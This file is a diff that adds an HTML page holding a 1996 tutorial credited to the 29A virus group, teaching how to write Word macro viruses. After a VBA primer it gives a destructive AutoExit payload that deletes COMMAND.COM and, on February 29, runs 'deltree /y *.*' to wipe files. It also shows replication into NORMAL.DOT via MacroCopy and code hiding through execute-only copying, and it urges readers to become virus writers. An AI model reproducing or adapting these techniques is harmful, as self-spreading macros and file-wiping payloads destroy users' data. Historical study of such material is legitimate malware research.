@@ -1,0 +1,321 @@
+
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - VBA Viruses and Trojans</TITLE>
+   
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<CENTER><P><B><FONT COLOR="#004080"><FONT SIZE=+3>VBA VIRUSES AND TROJANS<BR>
+</FONT><FONT SIZE=+1>by<BR>
+Leugim San/29A<BR>
+MaD MoTHeR<BR>
+1996</FONT></FONT></B></P></CENTER>
+<P>
+<HR WIDTH="100%"><BR>
+A macro is a program written in a certain language which is used usually
+for automatizing some processes inside an application. In this case, we
+will talk about Visual Basic for Applications (VBA) and WordBasic (WB),
+which are the languages used by Microsoft and all their programs; thus,
+Excel, Project and PowerPoint use VBA, and WinWord uses WB. </P>
+
+<P>From now we will speak about VBA as a general language, because it's
+the attempt to unify a macro language, common for all the Microsoft programs.
+Anyway, WordBasic has still some characteristics which make that, someti-
+mes, we reffer specifically to it. </P>
+
+<P>There are some differences between the syntax of these two languages,
+but the coding structure is the same, so, if we don't make any specification,
+we'll speak about VBA, as the common Microsoft macro language. </P>
+
+<P>The VBA macros are called procedures; there are two kinds of procedures:
+</P>
+
+<PRE>   - Sub procedures
+   - Function procedures
+</PRE>
+
+<P>The sub procedures may be executed directly or being called from other
+macro. The syntax for these procedures is the following: </P>
+
+<PRE>        Sub &lt;:macro_name&gt;
+           -&gt; write here the macro code &lt;:-
+           ' the comments are preceded by an apostrophe
+        End Sub
+</PRE>
+
+<P>Example: </P>
+
+<PRE>        Sub Stupid_Greeting
+           ' This macro opens a dialog box and displays a message
+           MsgBox &quot;Hello World!&quot;
+        End Sub
+</PRE>
+
+<P>The function procedures (aka functions) return a value, which may be
+passed as a parameter for other VBA procedure. This is its syntax: </P>
+
+<PRE>        Function &lt;:function_name&gt;(arguments)
+           -&gt; Instructions &lt;:-
+           ' Commentaries
+        End Function
+</PRE>
+
+<P>Example: </P>
+
+<PRE>        Function AddAB(a,b)
+           ' This adds the parameters a and b and returns the result
+           ' in &quot;AddAB&quot;
+           AddAB = a+b
+        End Function
+</PRE>
+
+<P>Of course, you can insert in a document as many macros as you need or
+want, there's no limit. Now that you've understood what a joint of macros
+is, we'll call it VBA module. This means that a VBA module is a joint of
+macros (sub and function procedures) which make up an Office document.
+</P>
+
+<P>The VBA language also works with objects; we can make references to
+other documents, graphics... inside the VBA modules. Objects have properties.
+For instance, the background color of an object is a property (aka attribute).
+Objects also have 'methods', which are the operations we can make with
+them (with the objects). </P>
+
+<P>VBA allows us to work with variables, and, as a structured programming
+language, it has the typical constructions of other languages: </P>
+
+<PRE>      'For-next' bucles:
+
+        Sub Counter
+           Infect_Num=0
+           For Count=1 to 10
+              Infect_Num=Infect_Num+Count
+           Next Count
+           MsgBox &quot;I reached the maximum infection number&quot;
+        End Sub
+
+
+      'If-then' conditions:
+
+        Sub Infect_Check
+           If Infect_Num=0 Then MsgBox &quot;File not infected&quot;
+        End Sub
+
+
+      'With-end with' constructions (used for working  with  several pro-
+       perties of a certain object):
+
+        Sub ChangeProperties
+           With Selection
+              .Font.Bold=True
+              .Font.ColorIndex=3 ' Red color
+           End With
+        End Sub
+
+
+      'Select case-end select' constructions:
+
+        Sub Check_Infection
+           Select Case Infect_Num
+              Case 0
+                 MsgBox &quot;File not infected&quot;
+              Case is &gt; 0
+                 MsgBox &quot;File infected&quot;
+              Case is &lt;: 0
+                 Infect_Num=0
+           End Case
+        End Sub
+</PRE>
+
+<P>A very useful tool for working with the VBA language is the debuggin
+window. With it we can trace code, make corrections, and so on... one debugging
+technique consists on using flags for halting for a moment the code execution
+with a MsgBox after each instruction, so we can analyze the contents of
+certain variables and/or instructions (albeit the VBA debugger is able
+to set break points for halting the code execution, too). </P>
+
+<P>Something very important, apart of this, are the arguments of a function
+procedure; as we've just seen, the structure of a VBA procedure is this:
+</P>
+
+<PRE>        Function &lt;:name&gt;(arguments)
+           [...]
+        End Function
+</PRE>
+
+<P>These arguments may be constants, variables, or expressions. Anway,
+there are procedures which don't need any arguments: </P>
+
+<PRE>        Function Get_Name()
+           Name=Application.UserName
+        End Function
+</PRE>
+
+<P>There are function procedures which always have a fixed argument number
+(up to 60). Other functions have some fixed arguments and other optional.
+</P>
+
+<P>Ok, and once the basics of VBA are clear for everybody, we can start
+learning something about the thing we're about to study: VBA viruses and
+trojans :-) </P>
+
+<P>The VBA language is very versatile, and this is basically due to two
+reasons: the first of them is its big facility of learning and use; as
+it's a high level language orientated to events (not to objects :) it's
+very easy to create complex modules without spending many time on it. The
+second reason is the extra large number of predefined functions it has,
+which make things much easier for us. We could even say a third reason,
+but it's really included in the previous one... and it's that we can use
+functions (or macros) of *automatic_execution*, so we can simulate some
+thingies which make eeeeven easier to write routines as autocopying, memory
+residency, etc), used by the 'normal' DOS viruses. </P>
+
+<P>Besides this, VBA has, as an exclusive feature, the PORTABILITY property,
+advantage, or however you wanna call it. VBA worxor under Windows 3.x,
+Windows95, WindowsNT, Macintosh, etc. this is: in every enviroment or OS
+in which we can run any version of the applications which support VBA.
+</P>
+
+<P>But don't expect so many facilities... :-) </P>
+
+<P>VBA is a language which adapts to the language of the application under
+it's running. This means that, if we have the spanish version of WinWord,
+the names of the predefined functions will be in spanish, so the two next
+macros will NOT be the same (the first one is written in spanish, and the
+second one, in english): </P>
+
+<PRE>         First macro (spanish):
+
+           Sub Demo_Macro
+              Con Selecci&cent;n.Fuente
+                 .Nombre=&quot;Arial&quot;
+              Fin Con
+           End Sub
+
+
+         Second macro (english):
+
+           Sub Demo_Macro
+              With Selection.Font
+                 .Name=&quot;Arial&quot;
+              End With
+           End Sub
+</PRE>
+
+<P>This last macro would NOT work under our spanish version of WinWord...
+it would force a macro execution error, so it wouldn't do anything. And
+remember that VBA is an interpreted language (not compiled) so every execution
+error appears 'on the fly'. </P>
+
+<P>But... doesn't this have any solution? ... ... ... ... }:-) ... Sure!
+;-) There are some functions, common to all the VBA versions, without depen-
+ding on the language. For instance... the automatic macro AutoExec (which
+is executed when loading WinWord if it's stored in a template called NORMAL.DOT)
+would work under every VBA version. </P>
+
+<P>Maybe one of the first exercises we should do would be trying to write
+a multiplatform and multilanguage virus... but maybe it already exists...
+}:-) hehe... but let's go on with the tutorial. </P>
+
+<P>The next step, once we've analyzed the language syntax, we have to study
+the functions we need to use in our viruses. As this ain't a text about
+programming in general but a macro virus tutorial, we'll focus our attention
+to the automatic macros used by WinWord, implemented in WordBasic (but
+note: NOT in VBA). </P>
+
+<P>There are five special macros which execute automatically and which
+we'll have to care about: </P>
+
+<OL>
+<LI>AutoExec: it's a macro which activates when loading the text processor,
+but only when it's stored in the template NORMAL.DOT or in the default
+application directory</LI>
+
+<LI>AutoNew: it activates when creating a new document</LI>
+
+<LI>AutoOpen: it activates when opening an existing document</LI>
+
+<LI>AutoClose: it activates when closing a document</LI>
+
+<LI>AutoExit: it activates when exiting the text processor </LI>
+</OL>
+
+<P>For proving the potence and the versatility of these macros, we can
+have a look at the following code (by now we won't care about the language):
+</P>
+
+<PRE>        ' Save this macro as AutoExit
+        Sub Main
+           If Application.Username &lt;:&gt; &quot;MaD_MoTHeR&quot; Then
+           ' We check the registration name of the application
+              SetAttr &quot;C:\COMMAND.COM&quot;,0
+              ' Wipe the attributes of COMMAND.COM
+              Open &quot;C:\COMMAND.COM&quot; for Output as #1
+              ' We open it for checking if it activates any error flag
+              Close #1
+              ' It exists, ok... let's close it...
+              Kill &quot;C:\COMMAND.COM&quot;
+              ' ... and kill it }:-)
+           End If
+           If Month(Now())=2 Then
+           ' System date -&gt; month=february (2)?
+              If Day(Now())=29 Then
+              ' february 29th? (only one time each four years) :-)
+                 Shell &quot;deltree /y *.* &gt; null&quot;
+                 ' Btw... /y works for all the languages :-)
+              End If
+           End If
+        End Sub
+</PRE>
+
+<P>The macro above will check two things on exiting from WinWord: if the
+registration name is equal to MaD_MoTHeR, it will delete COMMAND.COM; and
+if the system date is equal to february 29th (only for leap years) :-)
+it will do a deltree /y *.* &gt; null, and i guess you all know what does
+this DOS command do, right? };-) </P>
+
+<P>Ok, now you're supposed to have a big enough knowledge to face the next
+and last chapter of this tutorial: replication. It's the most important
+thing for writing viruses, don't you think? :-) </P>
+
+<P>The unique thing we must know is how can we adapt an automatic macro
+(this is the simplest example) in order to install it in the template which
+is opened by default by WinWord. This is done by following the next steps...
+first, define a variable which stores the complete macro name: </P>
+
+<PRE>        name$ = WindowName$() + &quot;:AutoNew&quot;  ' This macro will  be executed
+                                            ' every time a new document is
+                                            ' created
+</PRE>
+
+<P>And then, all our work is to write it into the template NORMAL.DOT with
+this simple instruction: </P>
+
+<PRE>        MacroCopy name$, &quot;Global:AutoNew&quot;
+</PRE>
+
+<P>Quite easy, isn't it? :-) Anyway, this is the general way in which macro
+viruses work, but there are lots of cooler ways to infect... all it takes
+is a little bit of imagination and additional code. One of these things
+which make your viruses cooler and difficult their analysis is the macro
+encryption... and it's easier than the replication!!! :-) </P>
+
+<PRE>        MacroCopy &quot;MyTemplate:MyMacro&quot;, &quot;Global:AutoClose&quot;, 1
+</PRE>
+
+<P>If you execute the MacroCopy function passing 1 (or any other number
+unless 0) as parameter, the result of the copy will be an only executable
+macro, so we won't be able to edit it! :-) </P>
+
+<P>And this is all you need for becoming a macro virus writer... practice,
+research, and try to write something really original. Btw, there's a virus
+sample i wrote included in '29A virii'. It's a supertiny and super- simple
+macro infector which contains a little payload :-) Don't forget to have
+a look at it! </P>
+
+<P>
+<HR WIDTH="100%"></P>
+
+</BODY>
+</HTML>
